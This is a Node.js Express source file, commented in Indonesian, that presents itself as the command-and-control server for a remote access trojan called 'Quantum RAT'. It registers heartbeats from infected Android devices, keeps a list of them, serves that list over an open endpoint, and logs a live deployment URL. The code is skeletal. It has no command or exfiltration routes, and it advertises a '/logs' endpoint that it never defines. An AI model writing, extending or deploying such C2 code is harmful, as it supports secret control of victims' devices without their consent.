const express = require('express');
const cors = require('cors');

const app = express();

// ===== CORS =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== DATA =====
let devices = [];
let logs = [];

// ===== ROUTE: HEARTBEAT (INI YANG DIPAKE RAT) =====
app.post('/api/heartbeat', (req, res) => {
    const { device_id, status } = req.body;
    console.log(`💓 Heartbeat dari ${device_id}: ${status}`);
    
    const existing = devices.find(d => d.id === device_id);
    if (existing) {
        existing.last_seen = new Date().toISOString();
    } else {
        devices.push({
            id: device_id || 'Android',
            status: status || 'online',
            first_seen: new Date().toISOString(),
            last_seen: new Date().toISOString()
        });
    }
    
    res.json({ 
        status: 'ok', 
        message: 'Heartbeat diterima!',
        devices: devices.length
    });
});

// ===== ROUTE: CEK DEVICE =====
app.get('/api/devices', (req, res) => {
    res.json(devices);
});

// ===== ROUTE: TEST (BUAT NGETES) =====
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'ok', 
        message: 'Server C2 aktif!',
        devices: devices.length,
        uptime: process.uptime()
    });
});

// ===== ROUTE: ROOT =====
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Quantum RAT C2 is running!',
        endpoints: ['/api/heartbeat', '/api/devices', '/api/test', '/logs']
    });
});

// ===== START =====
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server jalan di port ${PORT}`);
    console.log(`🌐 Test: https://quantum-c2-backend-production.up.railway.app/api/test`);
});
